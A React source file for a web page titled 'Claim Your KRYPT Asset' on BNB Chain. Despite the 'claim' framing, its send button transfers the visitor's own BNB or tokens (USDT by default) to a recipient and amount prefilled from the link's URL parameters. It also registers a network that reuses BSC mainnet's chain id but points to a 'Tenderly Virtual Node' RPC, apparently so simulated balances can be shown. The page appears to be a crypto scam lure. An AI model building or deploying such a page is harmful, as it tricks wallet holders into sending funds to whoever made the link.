
import React,{useEffect,useRef,useState} from 'react'
import { getRpcUrl, DEFAULT_TOKEN } from './config'

const CHAIN_ID_HEX='0x38'
function short(a){return a?a.slice(0,6)+'…'+a.slice(-4):''}
function strip0x(s){return s&&s.startsWith('0x')?s.slice(2):s}
function encodeERC20Transfer(to,amountHex){const sel='a9059cbb';const addr=strip0x(to).toLowerCase().padStart(64,'0');const val=strip0x(amountHex).padStart(64,'0');return '0x'+sel+addr+val}
function toTokenUnitsHex(amountStr,decimals){if(!amountStr)return'0x0';const parts=amountStr.split('.');const whole=parts[0]||'0';const frac=parts[1]||'';const padded=(frac+'0'.repeat(decimals)).slice(0,decimals);const combined=whole+padded;const bn=BigInt(combined);return'0x'+bn.toString(16)}
function toWeiHex(a){return toTokenUnitsHex(a,18)}
async function rpcCall(rpcUrl,method,params){const res=await fetch(rpcUrl,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:Date.now(),method,params})});if(!res.ok)throw new Error('RPC HTTP '+res.status);const j=await res.json();if(j.error)throw new Error(j.error.message||JSON.stringify(j.error));return j.result}

export default function App(){
  const rpcDefault=getRpcUrl()
  const [rpcUrl,setRpcUrl]=useState(rpcDefault)
  const [account,setAccount]=useState(null)
  const [status,setStatus]=useState('idle')
  const [txHash,setTxHash]=useState('')
  const [tx,setTx]=useState(null)
  const [receipt,setReceipt]=useState(null)
  const [polling,setPolling]=useState(false)
  const pollRef=useRef(null)
  const [to,setTo]=useState('')
  const [amount,setAmount]=useState('')
  const [token,setToken]=useState(DEFAULT_TOKEN.address)
  const [tokenDecimals,setTokenDecimals]=useState(18)
  const [tokenSymbol,setTokenSymbol]=useState(DEFAULT_TOKEN.symbol)

  useEffect(()=>{const p=new URLSearchParams(location.search);const qTo=p.get('to');const qAmount=p.get('amount');const qToken=p.get('token');if(qTo)setTo(qTo);if(qAmount)setAmount(qAmount);if(qToken){setToken(qToken);setTokenSymbol('TOKEN')}else{setToken(DEFAULT_TOKEN.address);setTokenSymbol(DEFAULT_TOKEN.symbol)};if(window.ethereum){window.ethereum.request({method:'eth_accounts'}).then(a=>{if(a&&a[0])setAccount(a[0])}).catch(()=>{});window.ethereum.on&&window.ethereum.on('accountsChanged',a=>{if(a&&a[0])setAccount(a[0])else setAccount(null)})}},[])

  useEffect(()=>{async function fetchDecimals(){if(!token)return; if(!token.startsWith('0x'))return; try{const data='0x313ce567';const res=await rpcCall(rpcUrl,'eth_call',[{to:token,data},'latest']); if(res){const d=parseInt(res,16); if(Number.isFinite(d)) setTokenDecimals(d)}}catch(e){setTokenDecimals(18)}};fetchDecimals()},[token,rpcUrl])

  useEffect(()=>{if(txHash)startPolling(txHash)},[txHash])

  const addNetwork=async()=>{if(!window.ethereum)return alert('Install MetaMask');try{await window.ethereum.request({method:'wallet_addEthereumChain',params:[{chainId:CHAIN_ID_HEX,chainName:'BSC Tenderly Virtual Node',rpcUrls:[rpcUrl],nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18},blockExplorerUrls:['https://bscscan.com']}]});setStatus('Network add requested')}catch(e){setStatus('Add network failed')}}
  const connect=async()=>{if(!window.ethereum)return alert('Install MetaMask');try{const a=await window.ethereum.request({method:'eth_requestAccounts'});setAccount(a[0]||null);setStatus('Wallet connected')}catch(e){setStatus('Connect rejected')}}
  const sendClaim=async()=>{if(!account)return alert('Connect wallet first'); if(!to||!amount)return alert('Missing recipient or amount'); try{setStatus('Preparing tx...'); if(!token){const value=toWeiHex(amount);const txParams={from:account,to,value};const hash=await window.ethereum.request({method:'eth_sendTransaction',params:[txParams]});setTxHash(hash);setStatus('Sent (BNB): '+hash)}else{const decimals=tokenDecimals||18;const valueHex=toTokenUnitsHex(amount,decimals);const data=encodeERC20Transfer(to,valueHex);const txParams={from:account,to:token,data};const hash=await window.ethereum.request({method:'eth_sendTransaction',params:[txParams]});setTxHash(hash);setStatus('Sent (token): '+hash)}}catch(e){console.error(e);setStatus('Send failed: '+(e.message||e))}}
  const loadTx=async(h)=>{if(!h)return; stopPolling(); setStatus('Fetching...'); setTx(null); setReceipt(null); try{const t=await rpcCall(rpcUrl,'eth_getTransactionByHash',[h]); if(!t){setStatus('Not found'); return} setTx(t); try{const r=await rpcCall(rpcUrl,'eth_getTransactionReceipt',[h]); setReceipt(r); if(!r) startPolling(h)}catch{ startPolling(h)} setStatus('Loaded')}catch(e){setStatus('Fetch failed'); console.error(e)}}
  const startPolling=(h)=>{ if(pollRef.current) return; setPolling(true); pollRef.current=setInterval(async()=>{ try{ const r=await rpcCall(rpcUrl,'eth_getTransactionReceipt',[h]); if(r){ setReceipt(r); setStatus(parseInt(r.status,16)===1?'Success':'Failed'); stopPolling() } else setStatus('Pending...') }catch(e){console.error(e)} },8000) }
  const stopPolling=()=>{ if(pollRef.current){ clearInterval(pollRef.current); pollRef.current=null; setPolling(false) } }

  return React.createElement('div',{className:'container'}, React.createElement('div',{className:'card'}, React.createElement('div',{style:{display:'flex',gap:12,alignItems:'center'}}, React.createElement('img',{src:'https://i.imgur.com/K7U4FtB.png',alt:'Kryptoken',style:{width:48,height:48,borderRadius:8}}), React.createElement('div',null, React.createElement('h1',{style:{margin:0}},'Claim Your KRYPT Asset'), React.createElement('div',{style:{color:'#64748b',fontSize:13}},'BNB Chain (Tenderly Virtual Node)')), React.createElement('div',{style:{marginLeft:'auto'}}, account?`Connected: ${short(account)}`:'Not connected')), React.createElement('div',{style:{marginTop:14,display:'flex',gap:8}}, React.createElement('button',{onClick:addNetwork},'Add / Switch Network'), React.createElement('button',{onClick:connect}, account?short(account):'Connect Wallet')), React.createElement('hr',{style:{margin:'16px 0'}}), React.createElement('h2',null,'Claim Link'), React.createElement('div',{style:{color:'#475569',fontSize:13}}, React.createElement('code',null,'?to=&amount=&token=')), React.createElement('div',{style:{marginTop:12}}, React.createElement('label',null,'Recipient (to)'), React.createElement('input',{value:to,onChange:(e)=>setTo(e.target.value),style:{width:'100%',padding:8,marginTop:6},placeholder:'0x...'})), React.createElement('div',{style:{marginTop:8}}, React.createElement('label',null,'Amount'), React.createElement('input',{value:amount,onChange:(e)=>setAmount(e.target.value),style:{width:'100%',padding:8,marginTop:6},placeholder:'Decimal amount e.g. 1.5'})), React.createElement('div',{style:{marginTop:8}}, React.createElement('label',null,'Token (optional contract address) — default USDT'), React.createElement('input',{value:token,onChange:(e)=>setToken(e.target.value),style:{width:'100%',padding:8,marginTop:6},placeholder:'0x... or leave blank for BNB'}), React.createElement('div',{style:{marginTop:6,fontSize:13,color:'#475569'}},`Detected decimals: ${tokenDecimals} — symbol: ${tokenSymbol}`)), React.createElement('div',{style:{marginTop:12,display:'flex',gap:8}}, React.createElement('button',{onClick:sendClaim,style:{background:'#1E3A8A',color:'white',padding:'8px 14px'}},'Send Transaction'), React.createElement('button',{onClick:()=>loadTx(txHash),style:{padding:'8px 14px'}},'Refresh Tx'), React.createElement('input',{value:txHash,onChange:(e)=>setTxHash(e.target.value),placeholder:'tx hash',style:{flex:1,padding:8}})), React.createElement('div',{style:{marginTop:12}}, React.createElement('div',null,'Status: ', React.createElement('strong',null,status)), tx && React.createElement('div',{style:{marginTop:8,padding:8,background:'#f1f5f9'}}, React.createElement('div',null,'Tx: ', React.createElement('code',null,tx.hash))), receipt && React.createElement('div',{style:{marginTop:8,padding:8,background:'#f1f5f9'}}, 'Receipt status: ', parseInt(receipt && receipt.status,16)===1 ? 'Success' : 'Failed')), React.createElement('div',{style:{marginTop:12,fontSize:13,color:'#94a3b8'}}, 'RPC used: ', React.createElement('code',null,rpcUrl))))
}
